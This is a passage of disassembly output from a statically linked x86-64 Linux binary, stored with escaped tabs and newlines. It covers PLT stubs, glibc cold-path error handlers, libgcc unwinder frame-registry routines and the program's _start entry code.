%ax,%ax\n  401048:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a4030 <_GLOBAL_OFFSET_TABLE_+0x48>\n  40104e:\t66 90                \txchg   %ax,%ax\n  401050:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a4038 <_GLOBAL_OFFSET_TABLE_+0x50>\n  401056:\t66 90                \txchg   %ax,%ax\n  401058:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a4040 <_GLOBAL_OFFSET_TABLE_+0x58>\n  40105e:\t66 90                \txchg   %ax,%ax\n  401060:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a4048 <_GLOBAL_OFFSET_TABLE_+0x60>\n  401066:\t66 90                \txchg   %ax,%ax\n  401068:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a4050 <_GLOBAL_OFFSET_TABLE_+0x68>\n  40106e:\t66 90                \txchg   %ax,%ax\n  401070:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a4058 <_GLOBAL_OFFSET_TABLE_+0x70>\n  401076:\t66 90                \txchg   %ax,%ax\n  401078:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a4060 <_GLOBAL_OFFSET_TABLE_+0x78>\n  40107e:\t66 90                \txchg   %ax,%ax\n  401080:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a4068 <_GLOBAL_OFFSET_TABLE_+0x80>\n  401086:\t66 90                \txchg   %ax,%ax\n  401088:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a4070 <_GLOBAL_OFFSET_TABLE_+0x88>\n  40108e:\t66 90                \txchg   %ax,%ax\n  401090:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a4078 <_GLOBAL_OFFSET_TABLE_+0x90>\n  401096:\t66 90                \txchg   %ax,%ax\n  401098:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a4080 <_GLOBAL_OFFSET_TABLE_+0x98>\n  40109e:\t66 90                \txchg   %ax,%ax\n  4010a0:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a4088 <_GLOBAL_OFFSET_TABLE_+0xa0>\n  4010a6:\t66 90                \txchg   %ax,%ax\n  4010a8:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a4090 <_GLOBAL_OFFSET_TABLE_+0xa8>\n  4010ae:\t66 90                \txchg   %ax,%ax\n  4010b0:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a4098 <_GLOBAL_OFFSET_TABLE_+0xb0>\n  4010b6:\t66 90                \txchg   %ax,%ax\n  4010b8:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a40a0 <_GLOBAL_OFFSET_TABLE_+0xb8>\n  4010be:\t66 90                \txchg   %ax,%ax\n  4010c0:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a40a8 <_GLOBAL_OFFSET_TABLE_+0xc0>\n  4010c6:\t66 90                \txchg   %ax,%ax\n\nDisassembly of section .text:\n\n0000000000401100 <__libc_message_impl.cold>:\n  401100:\te8 06 00 00 00       \tcall   40110b <abort>\n\n0000000000401105 <_dl_start>:\n  401105:\t50                   \tpush   %rax\n  401106:\te8 00 00 00 00       \tcall   40110b <abort>\n\n000000000040110b <abort>:\n  40110b:\t48 81 ec b8 00 00 00 \tsub    $0xb8,%rsp\n  401112:\t64 48 8b 3c 25 28 00 \tmov    %fs:0x28,%rdi\n  401119:\t00 00 \n  40111b:\t48 89 bc 24 a8 00 00 \tmov    %rdi,0xa8(%rsp)\n  401122:\t00 \n  401123:\tbf 06 00 00 00       \tmov    $0x6,%edi\n  401128:\te8 e3 b8 04 00       \tcall   44ca10 <raise>\n  40112d:\t31 ff                \txor    %edi,%edi\n  40112f:\te8 6c 64 01 00       \tcall   4175a0 <__abort_lock_wrlock>\n  401134:\t31 c0                \txor    %eax,%eax\n  401136:\t48 8d 7c 24 10       \tlea    0x10(%rsp),%rdi\n  40113b:\t31 d2                \txor    %edx,%edx\n  40113d:\tb9 26 00 00 00       \tmov    $0x26,%ecx\n  401142:\t48 8d 74 24 10       \tlea    0x10(%rsp),%rsi\n  401147:\tf3 ab                \trep stos %eax,%es:(%rdi)\n  401149:\tbf 06 00 00 00       \tmov    $0x6,%edi\n  40114e:\t48 c7 44 24 18 ff ff \tmovq   $0xffffffffffffffff,0x18(%rsp)\n  401155:\tff ff \n  401157:\te8 14 b9 04 00       \tcall   44ca70 <__libc_sigaction>\n  40115c:\tbf 06 00 00 00       \tmov    $0x6,%edi\n  401161:\te8 6a 2d 02 00       \tcall   423ed0 <__pthread_raise_internal>\n  401166:\t48 8d 74 24 08       \tlea    0x8(%rsp),%rsi\n  40116b:\t41 ba 08 00 00 00    \tmov    $0x8,%r10d\n  401171:\t48 c7 44 24 08 20 00 \tmovq   $0x20,0x8(%rsp)\n  401178:\t00 00 \n  40117a:\t31 d2                \txor    %edx,%edx\n  40117c:\tbf 01 00 00 00       \tmov    $0x1,%edi\n  401181:\tb8 0e 00 00 00       \tmov    $0xe,%eax\n  401186:\t0f 05                \tsyscall \n  401188:\tf4                   \thlt    \n  401189:\tbf 7f 00 00 00       \tmov    $0x7f,%edi\n  40118e:\te8 1d 18 01 00       \tcall   4129b0 <_exit>\n\n0000000000401193 <_IO_fputs.cold>:\n  401193:\tf6 43 01 80          \ttestb  $0x80,0x1(%rbx)\n  401197:\t75 21                \tjne    4011ba <_IO_fputs.cold+0x27>\n  401199:\t48 8b bb 88 00 00 00 \tmov    0x88(%rbx),%rdi\n  4011a0:\t80 3d d1 38 0a 00 00 \tcmpb   $0x0,0xa38d1(%rip)        # 4a4a78 <__libc_single_threaded>\n  4011a7:\t8b 47 04             \tmov    0x4(%rdi),%eax\n  4011aa:\t74 16                \tje     4011c2 <_IO_fputs.cold+0x2f>\n  4011ac:\t85 c0                \ttest   %eax,%eax\n  4011ae:\t75 2a                \tjne    4011da <_IO_fputs.cold+0x47>\n  4011b0:\t31 c9                \txor    %ecx,%ecx\n  4011b2:\t31 f6                \txor    %esi,%esi\n  4011b4:\t48 89 4f 08          \tmov    %rcx,0x8(%rdi)\n  4011b8:\t89 37                \tmov    %esi,(%rdi)\n  4011ba:\t48 89 ef             \tmov    %rbp,%rdi\n  4011bd:\te8 8e fd 06 00       \tcall   470f50 <_Unwind_Resume>\n  4011c2:\t85 c0                \ttest   %eax,%eax\n  4011c4:\t75 14                \tjne    4011da <_IO_fputs.cold+0x47>\n  4011c6:\t31 d2                \txor    %edx,%edx\n  4011c8:\t48 89 57 08          \tmov    %rdx,0x8(%rdi)\n  4011cc:\t87 07                \txchg   %eax,(%rdi)\n  4011ce:\t83 e8 01             \tsub    $0x1,%eax\n  4011d1:\t7e e7                \tjle    4011ba <_IO_fputs.cold+0x27>\n  4011d3:\te8 c8 42 00 00       \tcall   4054a0 <__lll_lock_wake_private>\n  4011d8:\teb e0                \tjmp    4011ba <_IO_fputs.cold+0x27>\n  4011da:\t83 e8 01             \tsub    $0x1,%eax\n  4011dd:\t89 47 04             \tmov    %eax,0x4(%rdi)\n  4011e0:\teb d8                \tjmp    4011ba <_IO_fputs.cold+0x27>\n\n00000000004011e2 <_IO_fwrite.cold>:\n  4011e2:\tf6 43 01 80          \ttestb  $0x80,0x1(%rbx)\n  4011e6:\t75 21                \tjne    401209 <_IO_fwrite.cold+0x27>\n  4011e8:\t48 8b bb 88 00 00 00 \tmov    0x88(%rbx),%rdi\n  4011ef:\t80 3d 82 38 0a 00 00 \tcmpb   $0x0,0xa3882(%rip)        # 4a4a78 <__libc_single_threaded>\n  4011f6:\t8b 47 04             \tmov    0x4(%rdi),%eax\n  4011f9:\t74 16                \tje     401211 <_IO_fwrite.cold+0x2f>\n  4011fb:\t85 c0                \ttest   %eax,%eax\n  4011fd:\t75 2a                \tjne    401229 <_IO_fwrite.cold+0x47>\n  4011ff:\t31 c9                \txor    %ecx,%ecx\n  401201:\t31 f6                \txor    %esi,%esi\n  401203:\t48 89 4f 08          \tmov    %rcx,0x8(%rdi)\n  401207:\t89 37                \tmov    %esi,(%rdi)\n  401209:\t48 89 ef             \tmov    %rbp,%rdi\n  40120c:\te8 3f fd 06 00       \tcall   470f50 <_Unwind_Resume>\n  401211:\t85 c0                \ttest   %eax,%eax\n  401213:\t75 14                \tjne    401229 <_IO_fwrite.cold+0x47>\n  401215:\t31 d2                \txor    %edx,%edx\n  401217:\t48 89 57 08          \tmov    %rdx,0x8(%rdi)\n  40121b:\t87 07                \txchg   %eax,(%rdi)\n  40121d:\t83 e8 01             \tsub    $0x1,%eax\n  401220:\t7e e7                \tjle    401209 <_IO_fwrite.cold+0x27>\n  401222:\te8 79 42 00 00       \tcall   4054a0 <__lll_lock_wake_private>\n  401227:\teb e0                \tjmp    401209 <_IO_fwrite.cold+0x27>\n  401229:\t83 e8 01             \tsub    $0x1,%eax\n  40122c:\t89 47 04             \tmov    %eax,0x4(%rdi)\n  40122f:\teb d8                \tjmp    401209 <_IO_fwrite.cold+0x27>\n\n0000000000401231 <_IO_new_file_underflow.cold>:\n  401231:\t41 f6 44 24 01 80    \ttestb  $0x80,0x1(%r12)\n  401237:\t75 22                \tjne    40125b <_IO_new_file_underflow.cold+0x2a>\n  401239:\t49 8b bc 24 88 00 00 \tmov    0x88(%r12),%rdi\n  401240:\t00 \n  401241:\t80 3d 30 38 0a 00 00 \tcmpb   $0x0,0xa3830(%rip)        # 4a4a78 <__libc_single_threaded>\n  401248:\t8b 47 04             \tmov    0x4(%rdi),%eax\n  40124b:\t74 16                \tje     401263 <_IO_new_file_underflow.cold+0x32>\n  40124d:\t85 c0                \ttest   %eax,%eax\n  40124f:\t75 2a                \tjne    40127b <_IO_new_file_underflow.cold+0x4a>\n  401251:\t31 c9                \txor    %ecx,%ecx\n  401253:\t31 f6                \txor    %esi,%esi\n  401255:\t48 89 4f 08          \tmov    %rcx,0x8(%rdi)\n  401259:\t89 37                \tmov    %esi,(%rdi)\n  40125b:\t48 89 df             \tmov    %rbx,%rdi\n  40125e:\te8 ed fc 06 00       \tcall   470f50 <_Unwind_Resume>\n  401263:\t85 c0                \ttest   %eax,%eax\n  401265:\t75 14                \tjne    40127b <_IO_new_file_underflow.cold+0x4a>\n  401267:\t31 d2                \txor    %edx,%edx\n  401269:\t48 89 57 08          \tmov    %rdx,0x8(%rdi)\n  40126d:\t87 07                \txchg   %eax,(%rdi)\n  40126f:\t83 e8 01             \tsub    $0x1,%eax\n  401272:\t7e e7                \tjle    40125b <_IO_new_file_underflow.cold+0x2a>\n  401274:\te8 27 42 00 00       \tcall   4054a0 <__lll_lock_wake_private>\n  401279:\teb e0                \tjmp    40125b <_IO_new_file_underflow.cold+0x2a>\n  40127b:\t83 e8 01             \tsub    $0x1,%eax\n  40127e:\t89 47 04             \tmov    %eax,0x4(%rdi)\n  401281:\teb d8                \tjmp    40125b <_IO_new_file_underflow.cold+0x2a>\n\n0000000000401283 <_nl_load_domain.cold>:\n  401283:\te8 83 fe ff ff       \tcall   40110b <abort>\n\n0000000000401288 <__printf_fp_buffer_1.isra.0.cold>:\n  401288:\te8 7e fe ff ff       \tcall   40110b <abort>\n\n000000000040128d <__printf_fphex_buffer.cold>:\n  40128d:\te8 79 fe ff ff       \tcall   40110b <abort>\n\n0000000000401292 <_IO_new_fclose.cold>:\n  401292:\tf6 43 01 80          \ttestb  $0x80,0x1(%rbx)\n  401296:\t75 21                \tjne    4012b9 <_IO_new_fclose.cold+0x27>\n  401298:\t48 8b bb 88 00 00 00 \tmov    0x88(%rbx),%rdi\n  40129f:\t80 3d d2 37 0a 00 00 \tcmpb   $0x0,0xa37d2(%rip)        # 4a4a78 <__libc_single_threaded>\n  4012a6:\t8b 47 04             \tmov    0x4(%rdi),%eax\n  4012a9:\t74 16                \tje     4012c1 <_IO_new_fclose.cold+0x2f>\n  4012ab:\t85 c0                \ttest   %eax,%eax\n  4012ad:\t75 2a                \tjne    4012d9 <_IO_new_fclose.cold+0x47>\n  4012af:\t31 c9                \txor    %ecx,%ecx\n  4012b1:\t31 f6                \txor    %esi,%esi\n  4012b3:\t48 89 4f 08          \tmov    %rcx,0x8(%rdi)\n  4012b7:\t89 37                \tmov    %esi,(%rdi)\n  4012b9:\t48 89 ef             \tmov    %rbp,%rdi\n  4012bc:\te8 8f fc 06 00       \tcall   470f50 <_Unwind_Resume>\n  4012c1:\t85 c0                \ttest   %eax,%eax\n  4012c3:\t75 14                \tjne    4012d9 <_IO_new_fclose.cold+0x47>\n  4012c5:\t31 d2                \txor    %edx,%edx\n  4012c7:\t48 89 57 08          \tmov    %rdx,0x8(%rdi)\n  4012cb:\t87 07                \txchg   %eax,(%rdi)\n  4012cd:\t83 e8 01             \tsub    $0x1,%eax\n  4012d0:\t7e e7                \tjle    4012b9 <_IO_new_fclose.cold+0x27>\n  4012d2:\te8 c9 41 00 00       \tcall   4054a0 <__lll_lock_wake_private>\n  4012d7:\teb e0                \tjmp    4012b9 <_IO_new_fclose.cold+0x27>\n  4012d9:\t83 e8 01             \tsub    $0x1,%eax\n  4012dc:\t89 47 04             \tmov    %eax,0x4(%rdi)\n  4012df:\teb d8                \tjmp    4012b9 <_IO_new_fclose.cold+0x27>\n\n00000000004012e1 <__getdelim.cold>:\n  4012e1:\tf6 43 01 80          \ttestb  $0x80,0x1(%rbx)\n  4012e5:\t75 21                \tjne    401308 <__getdelim.cold+0x27>\n  4012e7:\t48 8b bb 88 00 00 00 \tmov    0x88(%rbx),%rdi\n  4012ee:\t80 3d 83 37 0a 00 00 \tcmpb   $0x0,0xa3783(%rip)        # 4a4a78 <__libc_single_threaded>\n  4012f5:\t8b 47 04             \tmov    0x4(%rdi),%eax\n  4012f8:\t74 16                \tje     401310 <__getdelim.cold+0x2f>\n  4012fa:\t85 c0                \ttest   %eax,%eax\n  4012fc:\t75 2a                \tjne    401328 <__getdelim.cold+0x47>\n  4012fe:\t31 c9                \txor    %ecx,%ecx\n  401300:\t31 f6                \txor    %esi,%esi\n  401302:\t48 89 4f 08          \tmov    %rcx,0x8(%rdi)\n  401306:\t89 37                \tmov    %esi,(%rdi)\n  401308:\t48 89 ef             \tmov    %rbp,%rdi\n  40130b:\te8 40 fc 06 00       \tcall   470f50 <_Unwind_Resume>\n  401310:\t85 c0                \ttest   %eax,%eax\n  401312:\t75 14                \tjne    401328 <__getdelim.cold+0x47>\n  401314:\t31 d2                \txor    %edx,%edx\n  401316:\t48 89 57 08          \tmov    %rdx,0x8(%rdi)\n  40131a:\t87 07                \txchg   %eax,(%rdi)\n  40131c:\t83 e8 01             \tsub    $0x1,%eax\n  40131f:\t7e e7                \tjle    401308 <__getdelim.cold+0x27>\n  401321:\te8 7a 41 00 00       \tcall   4054a0 <__lll_lock_wake_private>\n  401326:\teb e0                \tjmp    401308 <__getdelim.cold+0x27>\n  401328:\t83 e8 01             \tsub    $0x1,%eax\n  40132b:\t89 47 04             \tmov    %eax,0x4(%rdi)\n  40132e:\teb d8                \tjmp    401308 <__getdelim.cold+0x27>\n\n0000000000401330 <_IO_wfile_underflow.cold>:\n  401330:\t41 f6 46 01 80       \ttestb  $0x80,0x1(%r14)\n  401335:\t75 24                \tjne    40135b <_IO_wfile_underflow.cold+0x2b>\n  401337:\t49 8b be 88 00 00 00 \tmov    0x88(%r14),%rdi\n  40133e:\t80 3d 33 37 0a 00 00 \tcmpb   $0x0,0xa3733(%rip)        # 4a4a78 <__libc_single_threaded>\n  401345:\t8b 47 04             \tmov    0x4(%rdi),%eax\n  401348:\t74 29                \tje     401373 <_IO_wfile_underflow.cold+0x43>\n  40134a:\t85 c0                \ttest   %eax,%eax\n  40134c:\t75 3d                \tjne    40138b <_IO_wfile_underflow.cold+0x5b>\n  40134e:\t45 31 c0             \txor    %r8d,%r8d\n  401351:\t45 31 c9             \txor    %r9d,%r9d\n  401354:\t4c 89 47 08          \tmov    %r8,0x8(%rdi)\n  401358:\t44 89 0f             \tmov    %r9d,(%rdi)\n  40135b:\t48 8b 44 24 48       \tmov    0x48(%rsp),%rax\n  401360:\t64 48 2b 04 25 28 00 \tsub    %fs:0x28,%rax\n  401367:\t00 00 \n  401369:\t75 28                \tjne    401393 <_IO_wfile_underflow.cold+0x63>\n  40136b:\t48 89 df             \tmov    %rbx,%rdi\n  40136e:\te8 dd fb 06 00       \tcall   470f50 <_Unwind_Resume>\n  401373:\t85 c0                \ttest   %eax,%eax\n  401375:\t75 14                \tjne    40138b <_IO_wfile_underflow.cold+0x5b>\n  401377:\t31 f6                \txor    %esi,%esi\n  401379:\t48 89 77 08          \tmov    %rsi,0x8(%rdi)\n  40137d:\t87 07                \txchg   %eax,(%rdi)\n  40137f:\t83 e8 01             \tsub    $0x1,%eax\n  401382:\t7e d7                \tjle    40135b <_IO_wfile_underflow.cold+0x2b>\n  401384:\te8 17 41 00 00       \tcall   4054a0 <__lll_lock_wake_private>\n  401389:\teb d0                \tjmp    40135b <_IO_wfile_underflow.cold+0x2b>\n  40138b:\t83 e8 01             \tsub    $0x1,%eax\n  40138e:\t89 47 04             \tmov    %eax,0x4(%rdi)\n  401391:\teb c8                \tjmp    40135b <_IO_wfile_underflow.cold+0x2b>\n  401393:\te8 48 26 01 00       \tcall   4139e0 <__stack_chk_fail>\n\n0000000000401398 <__nptl_free_stacks.cold>:\n  401398:\te8 6e fd ff ff       \tcall   40110b <abort>\n\n000000000040139d <__pthread_once_slow.isra.0.cold>:\n  40139d:\t83 7c 24 10 00       \tcmpl   $0x0,0x10(%rsp)\n  4013a2:\t74 18                \tje     4013bc <__pthread_once_slow.isra.0.cold+0x1f>\n  4013a4:\t48 8b 7c 24 08       \tmov    0x8(%rsp),%rdi\n  4013a9:\tff 14 24             \tcall   *(%rsp)\n  4013ac:\t31 c0                \txor    %eax,%eax\n  4013ae:\t31 f6                \txor    %esi,%esi\n  4013b0:\t4c 89 e7             \tmov    %r12,%rdi\n  4013b3:\t89 44 24 10          \tmov    %eax,0x10(%rsp)\n  4013b7:\te8 b4 37 06 00       \tcall   464b70 <__pthread_cleanup_pop>\n  4013bc:\t48 8b 44 24 38       \tmov    0x38(%rsp),%rax\n  4013c1:\t64 48 2b 04 25 28 00 \tsub    %fs:0x28,%rax\n  4013c8:\t00 00 \n  4013ca:\t75 08                \tjne    4013d4 <__pthread_once_slow.isra.0.cold+0x37>\n  4013cc:\t48 89 df             \tmov    %rbx,%rdi\n  4013cf:\te8 7c fb 06 00       \tcall   470f50 <_Unwind_Resume>\n  4013d4:\te8 07 26 01 00       \tcall   4139e0 <__stack_chk_fail>\n\n00000000004013d9 <__printf_buffer_flush.cold>:\n  4013d9:\t0f 0b                \tud2    \n\n00000000004013db <__wprintf_buffer_flush.cold>:\n  4013db:\t0f 0b                \tud2    \n\n00000000004013dd <uw_install_context_1.cold>:\n  4013dd:\te8 29 fd ff ff       \tcall   40110b <abort>\n\n00000000004013e2 <read_encoded_value.cold>:\n  4013e2:\te8 24 fd ff ff       \tcall   40110b <abort>\n\n00000000004013e7 <execute_stack_op.cold>:\n  4013e7:\te8 1f fd ff ff       \tcall   40110b <abort>\n  4013ec:\te8 1a fd ff ff       \tcall   40110b <abort>\n\n00000000004013f1 <uw_update_context_1.cold>:\n  4013f1:\te8 15 fd ff ff       \tcall   40110b <abort>\n  4013f6:\te8 10 fd ff ff       \tcall   40110b <abort>\n\n00000000004013fb <execute_cfa_program_specialized.cold>:\n  4013fb:\te8 0b fd ff ff       \tcall   40110b <abort>\n\n0000000000401400 <execute_cfa_program_generic.cold>:\n  401400:\te8 06 fd ff ff       \tcall   40110b <abort>\n\n0000000000401405 <uw_frame_state_for.cold>:\n  401405:\te8 01 fd ff ff       \tcall   40110b <abort>\n\n000000000040140a <uw_init_context_1.cold>:\n  40140a:\te8 fc fc ff ff       \tcall   40110b <abort>\n\n000000000040140f <_Unwind_RaiseException_Phase2.cold>:\n  40140f:\te8 f7 fc ff ff       \tcall   40110b <abort>\n\n0000000000401414 <_Unwind_ForcedUnwind_Phase2.cold>:\n  401414:\te8 f2 fc ff ff       \tcall   40110b <abort>\n\n0000000000401419 <_Unwind_GetGR.cold>:\n  401419:\t50                   \tpush   %rax\n  40141a:\te8 ec fc ff ff       \tcall   40110b <abort>\n\n000000000040141f <_Unwind_SetGR.cold>:\n  40141f:\t50                   \tpush   %rax\n  401420:\te8 e6 fc ff ff       \tcall   40110b <abort>\n\n0000000000401425 <_Unwind_RaiseException.cold>:\n  401425:\te8 e1 fc ff ff       \tcall   40110b <abort>\n\n000000000040142a <_Unwind_Resume.cold>:\n  40142a:\te8 dc fc ff ff       \tcall   40110b <abort>\n\n000000000040142f <_Unwind_Resume_or_Rethrow.cold>:\n  40142f:\te8 d7 fc ff ff       \tcall   40110b <abort>\n\n0000000000401434 <_Unwind_Backtrace.cold>:\n  401434:\te8 d2 fc ff ff       \tcall   40110b <abort>\n\n0000000000401439 <read_encoded_value_with_base.cold>:\n  401439:\t50                   \tpush   %rax\n  40143a:\te8 cc fc ff ff       \tcall   40110b <abort>\n\n000000000040143f <fde_mixed_encoding_extract.cold>:\n  40143f:\te8 c7 fc ff ff       \tcall   40110b <abort>\n\n0000000000401444 <classify_object_over_fdes.cold>:\n  401444:\te8 c2 fc ff ff       \tcall   40110b <abort>\n\n0000000000401449 <__deregister_frame_info_bases.part.0.cold>:\n  401449:\te8 bd fc ff ff       \tcall   40110b <abort>\n\n000000000040144e <fde_single_encoding_extract.cold>:\n  40144e:\te8 b8 fc ff ff       \tcall   40110b <abort>\n\n0000000000401453 <fde_single_encoding_compare.cold>:\n  401453:\te8 b3 fc ff ff       \tcall   40110b <abort>\n\n0000000000401458 <fde_mixed_encoding_compare.cold>:\n  401458:\te8 ae fc ff ff       \tcall   40110b <abort>\n\n000000000040145d <add_fdes.isra.0.cold>:\n  40145d:\te8 a9 fc ff ff       \tcall   40110b <abort>\n\n0000000000401462 <linear_search_fdes.cold>:\n  401462:\te8 a4 fc ff ff       \tcall   40110b <abort>\n\n0000000000401467 <_Unwind_Find_FDE.cold>:\n  401467:\te8 9f fc ff ff       \tcall   40110b <abort>\n\n000000000040146c <base_of_encoded_value.cold>:\n  40146c:\t50                   \tpush   %rax\n  40146d:\te8 99 fc ff ff       \tcall   40110b <abort>\n\n0000000000401472 <read_encoded_value_with_base.cold>:\n  401472:\t50                   \tpush   %rax\n  401473:\te8 93 fc ff ff       \tcall   40110b <abort>\n\n0000000000401478 <__gcc_personality_v0.cold>:\n  401478:\te8 8e fc ff ff       \tcall   40110b <abort>\n  40147d:\t0f 1f 00             \tnopl   (%rax)\n\n0000000000401480 <btree_release_tree_recursively>:\n  401480:\t41 54                \tpush   %r12\n  401482:\t49 89 fc             \tmov    %rdi,%r12\n  401485:\t48 89 f7             \tmov    %rsi,%rdi\n  401488:\t55                   \tpush   %rbp\n  401489:\t53                   \tpush   %rbx\n  40148a:\t48 89 f3             \tmov    %rsi,%rbx\n  40148d:\te8 ce 00 07 00       \tcall   471560 <version_lock_lock_exclusive>\n  401492:\t8b 6b 0c             \tmov    0xc(%rbx),%ebp\n  401495:\t85 ed                \ttest   %ebp,%ebp\n  401497:\t75 22                \tjne    4014bb <btree_release_tree_recursively+0x3b>\n  401499:\t8b 43 08             \tmov    0x8(%rbx),%eax\n  40149c:\t85 c0                \ttest   %eax,%eax\n  40149e:\t74 1b                \tje     4014bb <btree_release_tree_recursively+0x3b>\n  4014a0:\t89 e8                \tmov    %ebp,%eax\n  4014a2:\t4c 89 e7             \tmov    %r12,%rdi\n  4014a5:\t83 c5 01             \tadd    $0x1,%ebp\n  4014a8:\t48 c1 e0 04          \tshl    $0x4,%rax\n  4014ac:\t48 8b 74 18 18       \tmov    0x18(%rax,%rbx,1),%rsi\n  4014b1:\te8 ca ff ff ff       \tcall   401480 <btree_release_tree_recursively>\n  4014b6:\t3b 6b 08             \tcmp    0x8(%rbx),%ebp\n  4014b9:\t72 e5                \tjb     4014a0 <btree_release_tree_recursively+0x20>\n  4014bb:\tc7 43 0c 02 00 00 00 \tmovl   $0x2,0xc(%rbx)\n  4014c2:\t49 8d 54 24 08       \tlea    0x8(%r12),%rdx\n  4014c7:\t49 8b 44 24 08       \tmov    0x8(%r12),%rax\n  4014cc:\t48 89 43 18          \tmov    %rax,0x18(%rbx)\n  4014d0:\tf0 48 0f b1 1a       \tlock cmpxchg %rbx,(%rdx)\n  4014d5:\t75 f5                \tjne    4014cc <btree_release_tree_recursively+0x4c>\n  4014d7:\t48 89 df             \tmov    %rbx,%rdi\n  4014da:\t5b                   \tpop    %rbx\n  4014db:\t5d                   \tpop    %rbp\n  4014dc:\t41 5c                \tpop    %r12\n  4014de:\te9 5d 05 07 00       \tjmp    471a40 <version_lock_unlock_exclusive>\n  4014e3:\t66 66 2e 0f 1f 84 00 \tdata16 cs nopw 0x0(%rax,%rax,1)\n  4014ea:\t00 00 00 00 \n  4014ee:\t66 90                \txchg   %ax,%ax\n\n00000000004014f0 <btree_destroy>:\n  4014f0:\t55                   \tpush   %rbp\n  4014f1:\t31 f6                \txor    %esi,%esi\n  4014f3:\t48 89 fd             \tmov    %rdi,%rbp\n  4014f6:\t53                   \tpush   %rbx\n  4014f7:\t48 83 ec 08          \tsub    $0x8,%rsp\n  4014fb:\t48 87 37             \txchg   %rsi,(%rdi)\n  4014fe:\t48 85 f6             \ttest   %rsi,%rsi\n  401501:\t75 29                \tjne    40152c <btree_destroy+0x3c>\n  401503:\t48 8b 5d 08          \tmov    0x8(%rbp),%rbx\n  401507:\t48 85 db             \ttest   %rbx,%rbx\n  40150a:\t74 19                \tje     401525 <btree_destroy+0x35>\n  40150c:\t0f 1f 40 00          \tnopl   0x0(%rax)\n  401510:\t48 89 df             \tmov    %rbx,%rdi\n  401513:\t48 8b 5b 18          \tmov    0x18(%rbx),%rbx\n  401517:\te8 e4 90 00 00       \tcall   40a600 <__free>\n  40151c:\t48 89 5d 08          \tmov    %rbx,0x8(%rbp)\n  401520:\t48 85 db             \ttest   %rbx,%rbx\n  401523:\t75 eb                \tjne    401510 <btree_destroy+0x20>\n  401525:\t48 83 c4 08          \tadd    $0x8,%rsp\n  401529:\t5b                   \tpop    %rbx\n  40152a:\t5d                   \tpop    %rbp\n  40152b:\tc3                   \tret    \n  40152c:\te8 4f ff ff ff       \tcall   401480 <btree_release_tree_recursively>\n  401531:\teb d0                \tjmp    401503 <btree_destroy+0x13>\n  401533:\t66 66 2e 0f 1f 84 00 \tdata16 cs nopw 0x0(%rax,%rax,1)\n  40153a:\t00 00 00 00 \n  40153e:\t66 90                \txchg   %ax,%ax\n\n0000000000401540 <release_registered_frames>:\n  401540:\tf3 0f 1e fa          \tendbr64 \n  401544:\t48 83 ec 08          \tsub    $0x8,%rsp\n  401548:\t48 8d 3d 01 9d 0a 00 \tlea    0xa9d01(%rip),%rdi        # 4ab250 <registered_frames>\n  40154f:\te8 9c ff ff ff       \tcall   4014f0 <btree_destroy>\n  401554:\t48 8d 3d d5 9c 0a 00 \tlea    0xa9cd5(%rip),%rdi        # 4ab230 <registered_objects>\n  40155b:\te8 90 ff ff ff       \tcall   4014f0 <btree_destroy>\n  401560:\tc6 05 c1 9c 0a 00 01 \tmovb   $0x1,0xa9cc1(%rip)        # 4ab228 <in_shutdown>\n  401567:\t48 83 c4 08          \tadd    $0x8,%rsp\n  40156b:\tc3                   \tret    \n  40156c:\t66 2e 0f 1f 84 00 00 \tcs nopw 0x0(%rax,%rax,1)\n  401573:\t00 00 00 \n  401576:\t66 2e 0f 1f 84 00 00 \tcs nopw 0x0(%rax,%rax,1)\n  40157d:\t00 00 00 \n\n0000000000401580 <_IO_stdfiles_init>:\n  401580:\t48 8b 05 79 3c 0a 00 \tmov    0xa3c79(%rip),%rax        # 4a5200 <_IO_list_all>\n  401587:\t48 85 c0             \ttest   %rax,%rax\n  40158a:\t74 28                \tje     4015b4 <_IO_stdfiles_init+0x34>\n  40158c:\t48 8d 15 6d 3c 0a 00 \tlea    0xa3c6d(%rip),%rdx        # 4a5200 <_IO_list_all>\n  401593:\t66 66 2e 0f 1f 84 00 \tdata16 cs nopw 0x0(%rax,%rax,1)\n  40159a:\t00 00 00 00 \n  40159e:\t66 90                \txchg   %ax,%ax\n  4015a0:\t48 89 90 b8 00 00 00 \tmov    %rdx,0xb8(%rax)\n  4015a7:\t48 8d 50 68          \tlea    0x68(%rax),%rdx\n  4015ab:\t48 8b 40 68          \tmov    0x68(%rax),%rax\n  4015af:\t48 85 c0             \ttest   %rax,%rax\n  4015b2:\t75 ec                \tjne    4015a0 <_IO_stdfiles_init+0x20>\n  4015b4:\tc3                   \tret    \n  4015b5:\t66 2e 0f 1f 84 00 00 \tcs nopw 0x0(%rax,%rax,1)\n  4015bc:\t00 00 00 \n  4015bf:\t90                   \tnop\n\n00000000004015c0 <_start>:\n  4015c0:\t31 ed                \txor    %ebp,%ebp\n  4015c2:\t49 89 d1             \tmov    %rdx,%r9\n  4015c5:\t5e                   \tpop    %rsi\n  4015c6:\t48 89 e2             \tmov    %rsp,%rdx\n  4015c9:\t48 83 e4 f0          \tand    $0xfffffffffffffff0,%rsp\n  4015cd:\t50                   \tpush   %rax\n  4015ce:\t54                   \tpush   %rsp\n  4015cf:\t45 31 c0             \txor    %r8d,%r8d\n  4015d2:\t31 c9                \txor    %ecx,%ecx\n  4015d4:\t48 c7 c7 1a 17 40 00 \tmov    $0x40171a,%rdi\n  4015db:\t67 e8 9f 27 00 00    \taddr32 call 403d80 <__libc_start_main>\n  4015e1:\tf4                   